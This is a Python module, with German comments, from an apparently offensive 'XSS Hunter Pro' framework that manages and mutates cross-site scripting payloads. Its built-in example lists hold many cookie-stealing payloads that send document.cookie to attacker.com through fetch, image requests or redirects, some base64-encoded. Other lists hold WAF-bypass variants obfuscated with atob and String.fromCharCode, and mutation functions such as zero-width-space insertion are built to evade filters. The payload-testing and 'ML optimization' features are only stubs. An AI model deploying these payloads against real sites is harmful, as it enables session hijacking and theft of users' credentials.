#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
XSS Hunter Pro Framework - Modules - Payload Manager
===================================================

Dieses Modul implementiert die Verwaltung und Generierung von XSS-Payloads.

Autor: Anonymous
Lizenz: MIT
Version: 0.3.0
"""

import os
import sys
import json
import logging
import time
import random
import re
from typing import Dict, List, Optional, Any, Tuple, Union, Set

# Konfiguriere Logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)

logger = logging.getLogger("XSSHunterPro.PayloadManager")

# Versuche, den Error Handler zu importieren
try:
    from error_handler import handle_exception, log_error
except ImportError:
    logger.warning("Error Handler konnte nicht importiert werden. Verwende einfache Fehlerbehandlung.")
    
    # Einfache Fehlerbehandlung
    def handle_exception(func):
        def wrapper(*args, **kwargs):
            try:
                return func(*args, **kwargs)
            except Exception as e:
                logger.error(f"Fehler: {e}")
                return None
        return wrapper
    
    def log_error(error, error_type="UNKNOWN_ERROR", details=None):
        logger.error(f"{error_type}: {error}")
        if details:
            logger.error(f"Details: {details}")

# Versuche, die Utility-Funktionen zu importieren
try:
    from utils import (
        is_valid_url, load_json_file, save_json_file, get_timestamp, format_timestamp
    )
except ImportError:
    logger.warning("Utils-Modul konnte nicht importiert werden. Verwende einfache Implementierungen.")
    
    # Einfache Implementierungen der benötigten Funktionen
    def is_valid_url(url):
        return bool(url and url.startswith(("http://", "https://")))
    
    def load_json_file(file_path):
        try:
            with open(file_path, "r") as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Fehler beim Laden der JSON-Datei: {e}")
            return {}
    
    def save_json_file(data, file_path):
        try:
            with open(file_path, "w") as f:
                json.dump(data, f, indent=2)
            return True
        except Exception as e:
            logger.error(f"Fehler beim Speichern der JSON-Datei: {e}")
            return False
    
    def get_timestamp():
        return int(time.time())
    
    def format_timestamp(timestamp, format="%Y-%m-%d %H:%M:%S"):
        return time.strftime(format, time.localtime(timestamp))


class PayloadManager:
    """
    Klasse für die Verwaltung und Generierung von XSS-Payloads.
    """
    
    # Standard-Payload-Dateien
    DEFAULT_PAYLOAD_FILES = {
        "basic": "payloads/basic.json",
        "advanced": "payloads/advanced.json",
        "dom": "payloads/dom.json",
        "waf_bypass": "payloads/waf_bypass.json",
        "custom": "payloads/custom.json"
    }
    
    # Payload-Kontexte
    PAYLOAD_CONTEXTS = [
        "html",
        "attribute",
        "javascript",
        "url",
        "style"
    ]
    
    # Payload-Variationen
    PAYLOAD_VARIATIONS = {
        "case": lambda p: p.swapcase(),
        "encode_hex": lambda p: p.replace("<", "&#x3c;").replace(">", "&#x3e;"),
        "encode_decimal": lambda p: p.replace("<", "&#60;").replace(">", "&#62;"),
        "double_encode": lambda p: p.replace("<", "%253c").replace(">", "%253e"),
        "no_quotes": lambda p: p.replace('"', "").replace("'", ""),
        "obfuscate_script": lambda p: p.replace("script", "scr\u200Bipt")
    }
    
    def __init__(self, payload_dir=None):
        """
        Initialisiert den Payload Manager.
        
        Args:
            payload_dir: Das Verzeichnis, in dem die Payload-Dateien gespeichert sind.
        """
        self.payload_dir = payload_dir or os.path.dirname(os.path.abspath(__file__))
        self.payloads = {}
        self.ml_model = None
        
        # Erstelle die Payload-Verzeichnisse, falls sie nicht existieren
        self._ensure_payload_directories()
        
        # Lade die Payloads
        self.load_payloads()
        
        # Versuche, das ML-Modell zu laden
        self._load_ml_model()
    
    def _ensure_payload_directories(self):
        """
        Stellt sicher, dass die Payload-Verzeichnisse existieren.
        """
        # Erstelle das Payloads-Verzeichnis, falls es nicht existiert
        payloads_dir = os.path.join(self.payload_dir, "payloads")
        
        if not os.path.exists(payloads_dir):
            try:
                os.makedirs(payloads_dir)
                logger.info(f"Payloads-Verzeichnis erstellt: {payloads_dir}")
            except Exception as e:
                logger.error(f"Fehler beim Erstellen des Payloads-Verzeichnisses: {e}")
        
        # Erstelle die Standard-Payload-Dateien, falls sie nicht existieren
        for payload_type, payload_file in self.DEFAULT_PAYLOAD_FILES.items():
            payload_path = os.path.join(self.payload_dir, payload_file)
            
            if not os.path.exists(payload_path):
                try:
                    # Erstelle das Verzeichnis, falls es nicht existiert
                    os.makedirs(os.path.dirname(payload_path), exist_ok=True)
                    
                    # Erstelle die Payload-Datei mit Beispiel-Payloads
                    example_payloads = self._get_example_payloads(payload_type)
                    
                    with open(payload_path, "w") as f:
                        json.dump(example_payloads, f, indent=2)
                    
                    logger.info(f"Payload-Datei erstellt: {payload_path}")
                except Exception as e:
                    logger.error(f"Fehler beim Erstellen der Payload-Datei: {e}")
    
    def _get_example_payloads(self, payload_type):
        """
        Gibt Beispiel-Payloads für den angegebenen Payload-Typ zurück.
        
        Args:
            payload_type: Der Payload-Typ.
        
        Returns:
            Die Beispiel-Payloads.
        """
        if payload_type == "basic":
            return {
                "html": [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>"
                ],
                "attribute": [
                    "\" onmouseover=\"alert('XSS')\"",
                    "' onclick='alert(\"XSS\")'"
                ],
                "javascript": [
                    "\";alert('XSS');//",
                    "'-alert('XSS')-'"
                ],
                "url": [
                    "javascript:alert('XSS')",
                    "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
                ],
                "style": [
                    "expression(alert('XSS'))",
                    "behavior: url(javascript:alert('XSS'))"
                ]
            }
        elif payload_type == "advanced":
            return {
                "html": [
                    "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
                    "<script>new Image().src='https://attacker.com/steal?cookie='+document.cookie</script>",
                    "<iframe src=\"javascript:alert(`XSS`)\"></iframe>"
                ],
                "attribute": [
                    "\" onfocus=\"fetch('https://attacker.com/steal?cookie='+document.cookie)\"",
                    "\" autofocus onfocus=\"fetch('https://attacker.com/steal?cookie='+document.cookie)\""
                ],
                "javascript": [
                    "\";fetch('https://attacker.com/steal?cookie='+document.cookie);//",
                    "';fetch('https://attacker.com/steal?cookie='+document.cookie);//"
                ],
                "url": [
                    "javascript:fetch('https://attacker.com/steal?cookie='+document.cookie)",
                    "javascript:eval(atob('ZmV0Y2goJ2h0dHBzOi8vYXR0YWNrZXIuY29tL3N0ZWFsP2Nvb2tpZT0nK2RvY3VtZW50LmNvb2tpZSk='))"
                ],
                "style": [
                    "background-image: url('javascript:fetch(\"https://attacker.com/steal?cookie=\"+document.cookie)')",
                    "background-image: url(javascript:fetch('https://attacker.com/steal?cookie='+document.cookie))"
                ]
            }
        elif payload_type == "dom":
            return {
                "html": [
                    "<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>",
                    "<script>window.location='https://attacker.com/steal?cookie='+document.cookie</script>",
                    "<script>location.href='https://attacker.com/steal?cookie='+document.cookie</script>"
                ],
                "attribute": [
                    "\" onclick=\"document.location='https://attacker.com/steal?cookie='+document.cookie\"",
                    "\" onclick=\"window.location='https://attacker.com/steal?cookie='+document.cookie\""
                ],
                "javascript": [
                    "\";document.location='https://attacker.com/steal?cookie='+document.cookie;//",
                    "';window.location='https://attacker.com/steal?cookie='+document.cookie;//"
                ],
                "url": [
                    "javascript:document.location='https://attacker.com/steal?cookie='+document.cookie",
                    "javascript:window.location='https://attacker.com/steal?cookie='+document.cookie"
                ],
                "style": [
                    "background-image: url('javascript:document.location=\"https://attacker.com/steal?cookie=\"+document.cookie')",
                    "background-image: url(javascript:window.location='https://attacker.com/steal?cookie='+document.cookie)"
                ]
            }
        elif payload_type == "waf_bypass":
            return {
                "html": [
                    "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
                    "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
                    "<svg><animate onbegin=alert('XSS') attributeName=x></animate></svg>"
                ],
                "attribute": [
                    "\" onmouseover=\"eval(atob('YWxlcnQoJ1hTUycpOw=='))\"",
                    "\" onmouseover=\"eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))\""
                ],
                "javascript": [
                    "\";eval(atob('YWxlcnQoJ1hTUycpOw=='));//",
                    "';eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41));//"
                ],
                "url": [
                    "javascript:eval(atob('YWxlcnQoJ1hTUycpOw=='))",
                    "javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))"
                ],
                "style": [
                    "background-image: url('javascript:eval(atob(\"YWxlcnQoJ1hTUycpOw==\"))')",
                    "background-image: url(javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41)))"
                ]
            }
        elif payload_type == "custom":
            return {
                "html": [],
                "attribute": [],
                "javascript": [],
                "url": [],
                "style": []
            }
        else:
            return {
                "html": [],
                "attribute": [],
                "javascript": [],
                "url": [],
                "style": []
            }
    
    def _load_ml_model(self):
        """
        Lädt das ML-Modell für die Payload-Optimierung.
        """
        try:
            # Versuche, scikit-learn zu importieren
            import sklearn
            from sklearn.ensemble import RandomForestClassifier
            
            # Hier würde das ML-Modell geladen werden
            # Da wir kein trainiertes Modell haben, erstellen wir ein einfaches Dummy-Modell
            self.ml_model = RandomForestClassifier(n_estimators=10)
            
            logger.info("ML-Modell geladen.")
        except ImportError:
            logger.warning("scikit-learn konnte nicht importiert werden. ML-basierte Payload-Optimierung ist nicht verfügbar.")
            self.ml_model = None
    
    @handle_exception
    def load_payloads(self):
        """
        Lädt die Payloads aus den Payload-Dateien.
        
        Returns:
            Die geladenen Payloads.
        """
        self.payloads = {}
        
        # Lade die Payloads aus den Payload-Dateien
        for payload_type, payload_file in self.DEFAULT_PAYLOAD_FILES.items():
            payload_path = os.path.join(self.payload_dir, payload_file)
            
            if os.path.exists(payload_path):
                try:
                    with open(payload_path, "r") as f:
                        self.payloads[payload_type] = json.load(f)
                    
                    logger.info(f"Payloads geladen: {payload_path}")
                except Exception as e:
                    logger.error(f"Fehler beim Laden der Payloads: {e}")
                    
                    # Verwende Beispiel-Payloads als Fallback
                    self.payloads[payload_type] = self._get_example_payloads(payload_type)
            else:
                logger.warning(f"Payload-Datei nicht gefunden: {payload_path}")
                
                # Verwende Beispiel-Payloads als Fallback
                self.payloads[payload_type] = self._get_example_payloads(payload_type)
        
        return self.payloads
    
    @handle_exception
    def save_payloads(self):
        """
        Speichert die Payloads in den Payload-Dateien.
        
        Returns:
            True, wenn die Payloads erfolgreich gespeichert wurden, sonst False.
        """
        # Speichere die Payloads in den Payload-Dateien
        for payload_type, payload_file in self.DEFAULT_PAYLOAD_FILES.items():
            if payload_type in self.payloads:
                payload_path = os.path.join(self.payload_dir, payload_file)
                
                try:
                    # Erstelle das Verzeichnis, falls es nicht existiert
                    os.makedirs(os.path.dirname(payload_path), exist_ok=True)
                    
                    with open(payload_path, "w") as f:
                        json.dump(self.payloads[payload_type], f, indent=2)
                    
                    logger.info(f"Payloads gespeichert: {payload_path}")
                except Exception as e:
                    logger.error(f"Fehler beim Speichern der Payloads: {e}")
                    return False
        
        return True
    
    @handle_exception
    def add_payload(self, payload, payload_type="custom", context="html"):
        """
        Fügt einen Payload hinzu.
        
        Args:
            payload: Der hinzuzufügende Payload.
            payload_type: Der Payload-Typ.
            context: Der Payload-Kontext.
        
        Returns:
            True, wenn der Payload erfolgreich hinzugefügt wurde, sonst False.
        """
        # Überprüfe, ob der Payload-Typ gültig ist
        if payload_type not in self.DEFAULT_PAYLOAD_FILES:
            logger.error(f"Ungültiger Payload-Typ: {payload_type}")
            return False
        
        # Überprüfe, ob der Payload-Kontext gültig ist
        if context not in self.PAYLOAD_CONTEXTS:
            logger.error(f"Ungültiger Payload-Kontext: {context}")
            return False
        
        # Überprüfe, ob der Payload bereits existiert
        if payload_type in self.payloads and context in self.payloads[payload_type]:
            if payload in self.payloads[payload_type][context]:
                logger.warning(f"Payload existiert bereits: {payload}")
                return False
        
        # Füge den Payload hinzu
        if payload_type not in self.payloads:
            self.payloads[payload_type] = {}
        
        if context not in self.payloads[payload_type]:
            self.payloads[payload_type][context] = []
        
        self.payloads[payload_type][context].append(payload)
        
        # Speichere die Payloads
        self.save_payloads()
        
        logger.info(f"Payload hinzugefügt: {payload}")
        
        return True
    
    @handle_exception
    def remove_payload(self, payload, payload_type="custom", context="html"):
        """
        Entfernt einen Payload.
        
        Args:
            payload: Der zu entfernende Payload.
            payload_type: Der Payload-Typ.
            context: Der Payload-Kontext.
        
        Returns:
            True, wenn der Payload erfolgreich entfernt wurde, sonst False.
        """
        # Überprüfe, ob der Payload-Typ gültig ist
        if payload_type not in self.DEFAULT_PAYLOAD_FILES:
            logger.error(f"Ungültiger Payload-Typ: {payload_type}")
            return False
        
        # Überprüfe, ob der Payload-Kontext gültig ist
        if context not in self.PAYLOAD_CONTEXTS:
            logger.error(f"Ungültiger Payload-Kontext: {context}")
            return False
        
        # Überprüfe, ob der Payload existiert
        if payload_type not in self.payloads or context not in self.payloads[payload_type]:
            logger.error(f"Payload-Typ oder Kontext existiert nicht: {payload_type}/{context}")
            return False
        
        if payload not in self.payloads[payload_type][context]:
            logger.error(f"Payload existiert nicht: {payload}")
            return False
        
        # Entferne den Payload
        self.payloads[payload_type][context].remove(payload)
        
        # Speichere die Payloads
        self.save_payloads()
        
        logger.info(f"Payload entfernt: {payload}")
        
        return True
    
    @handle_exception
    def generate_payload(self, payload_type="basic", context="html", index=None):
        """
        Generiert einen Payload.
        
        Args:
            payload_type: Der Payload-Typ.
            context: Der Payload-Kontext.
            index: Der Index des Payloads. Wenn None, wird ein zufälliger Payload ausgewählt.
        
        Returns:
            Der generierte Payload.
        """
        # Überprüfe, ob der Payload-Typ gültig ist
        if payload_type not in self.DEFAULT_PAYLOAD_FILES:
            logger.error(f"Ungültiger Payload-Typ: {payload_type}")
            return None
        
        # Überprüfe, ob der Payload-Kontext gültig ist
        if context not in self.PAYLOAD_CONTEXTS:
            logger.error(f"Ungültiger Payload-Kontext: {context}")
            return None
        
        # Überprüfe, ob Payloads für den angegebenen Typ und Kontext existieren
        if payload_type not in self.payloads or context not in self.payloads[payload_type]:
            logger.error(f"Keine Payloads für Typ/Kontext gefunden: {payload_type}/{context}")
            return None
        
        if not self.payloads[payload_type][context]:
            logger.error(f"Keine Payloads für Typ/Kontext gefunden: {payload_type}/{context}")
            return None
        
        # Wähle einen Payload aus
        if index is not None:
            if index < 0 or index >= len(self.payloads[payload_type][context]):
                logger.error(f"Ungültiger Payload-Index: {index}")
                return None
            
            payload = self.payloads[payload_type][context][index]
        else:
            payload = random.choice(self.payloads[payload_type][context])
        
        logger.info(f"Payload generiert: {payload}")
        
        return payload
    
    @handle_exception
    def generate_variations(self, payload, num_variations=5):
        """
        Generiert Variationen eines Payloads.
        
        Args:
            payload: Der Payload, für den Variationen generiert werden sollen.
            num_variations: Die Anzahl der zu generierenden Variationen.
        
        Returns:
            Die generierten Payload-Variationen.
        """
        variations = []
        
        # Generiere Variationen
        for _ in range(num_variations):
            # Wähle eine zufällige Variation aus
            variation_type = random.choice(list(self.PAYLOAD_VARIATIONS.keys()))
            variation_func = self.PAYLOAD_VARIATIONS[variation_type]
            
            # Generiere die Variation
            variation = variation_func(payload)
            
            # Füge die Variation hinzu, wenn sie nicht bereits existiert
            if variation not in variations and variation != payload:
                variations.append(variation)
        
        logger.info(f"{len(variations)} Payload-Variationen generiert.")
        
        return variations
    
    @handle_exception
    def optimize_payload(self, payload, context="html", use_ml=False):
        """
        Optimiert einen Payload für den angegebenen Kontext.
        
        Args:
            payload: Der zu optimierende Payload.
            context: Der Payload-Kontext.
            use_ml: Ob ML für die Optimierung verwendet werden soll.
        
        Returns:
            Der optimierte Payload.
        """
        # Überprüfe, ob der Payload-Kontext gültig ist
        if context not in self.PAYLOAD_CONTEXTS:
            logger.error(f"Ungültiger Payload-Kontext: {context}")
            return None
        
        # Optimiere den Payload basierend auf dem Kontext
        if context == "html":
            # Für HTML-Kontext: Verwende Standard-HTML-Tags
            if "<script>" not in payload.lower() and "<img" not in payload.lower() and "<svg" not in payload.lower():
                payload = f"<script>{payload}</script>"
        elif context == "attribute":
            # Für Attribut-Kontext: Füge Anführungszeichen und Event-Handler hinzu
            if "on" not in payload.lower():
                payload = f"\" onmouseover=\"{payload}\""
        elif context == "javascript":
            # Für JavaScript-Kontext: Füge JavaScript-Syntax hinzu
            if "alert" not in payload.lower() and "fetch" not in payload.lower():
                payload = f"\";{payload};//"
        elif context == "url":
            # Für URL-Kontext: Füge URL-Schema hinzu
            if not payload.lower().startswith("javascript:") and not payload.lower().startswith("data:"):
                payload = f"javascript:{payload}"
        elif context == "style":
            # Für Style-Kontext: Füge CSS-Syntax hinzu
            if "expression" not in payload.lower() and "url" not in payload.lower():
                payload = f"expression({payload})"
        
        # Verwende ML für die Optimierung, falls aktiviert
        if use_ml and self.ml_model is not None:
            try:
                # Hier würde das ML-Modell verwendet werden, um den Payload zu optimieren
                # Da wir kein trainiertes Modell haben, fügen wir einfach einen Kommentar hinzu
                payload = f"{payload} /* ML-optimiert */"
                
                logger.info(f"Payload mit ML optimiert: {payload}")
            except Exception as e:
                logger.error(f"Fehler bei der ML-Optimierung: {e}")
        
        logger.info(f"Payload optimiert: {payload}")
        
        return payload
    
    @handle_exception
    def test_payload(self, payload, url, param=None):
        """
        Testet einen Payload gegen eine URL.
        
        Args:
            payload: Der zu testende Payload.
            url: Die URL, gegen die der Payload getestet werden soll.
            param: Der Parameter, in dem der Payload eingefügt werden soll.
        
        Returns:
            Das Testergebnis.
        """
        # Überprüfe, ob die URL gültig ist
        if not is_valid_url(url):
            logger.error(f"Ungültige URL: {url}")
            return None
        
        # Hier würde der Payload gegen die URL getestet werden
        # Da wir keine tatsächliche Anfrage senden wollen, simulieren wir das Ergebnis
        
        # Simuliere das Testergebnis
        result = {
            "success": True,
            "url": url,
            "payload": payload,
            "param": param,
            "timestamp": get_timestamp(),
            "response": {
                "status_code": 200,
                "content_type": "text/html",
                "body": f"<html><body>Test with payload: {payload}</body></html>"
            }
        }
        
        logger.info(f"Payload getestet: {payload}")
        
        return result
    
    @handle_exception
    def get_payload_statistics(self):
        """
        Gibt Statistiken über die Payloads zurück.
        
        Returns:
            Die Payload-Statistiken.
        """
        statistics = {
            "total": 0,
            "by_type": {},
            "by_context": {}
        }
        
        # Zähle die Payloads nach Typ
        for payload_type in self.DEFAULT_PAYLOAD_FILES:
            if payload_type in self.payloads:
                count = 0
                
                for context in self.PAYLOAD_CONTEXTS:
                    if context in self.payloads[payload_type]:
                        count += len(self.payloads[payload_type][context])
                
                statistics["by_type"][payload_type] = count
                statistics["total"] += count
        
        # Zähle die Payloads nach Kontext
        for context in self.PAYLOAD_CONTEXTS:
            count = 0
            
            for payload_type in self.DEFAULT_PAYLOAD_FILES:
                if payload_type in self.payloads and context in self.payloads[payload_type]:
                    count += len(self.payloads[payload_type][context])
            
            statistics["by_context"][context] = count
        
        logger.info(f"Payload-Statistiken erstellt: {statistics}")
        
        return statistics


# Beispielverwendung
if __name__ == "__main__":
    # Erstelle einen Payload Manager
    payload_manager = PayloadManager()
    
    # Lade die Payloads
    payloads = payload_manager.load_payloads()
    
    print(f"Geladene Payloads: {len(payloads)}")
    
    # Generiere einen Payload
    payload = payload_manager.generate_payload("basic", "html")
    
    print(f"Generierter Payload: {payload}")
    
    # Generiere Payload-Variationen
    variations = payload_manager.generate_variations(payload)
    
    print(f"Generierte Variationen: {variations}")
    
    # Optimiere den Payload
    optimized_payload = payload_manager.optimize_payload(payload, "html")
    
    print(f"Optimierter Payload: {optimized_payload}")
    
    # Teste den Payload
    result = payload_manager.test_payload(payload, "https://example.com", "q")
    
    print(f"Testergebnis: {result}")
    
    # Erstelle Payload-Statistiken
    statistics = payload_manager.get_payload_statistics()
    
    print(f"Payload-Statistiken: {statistics}")
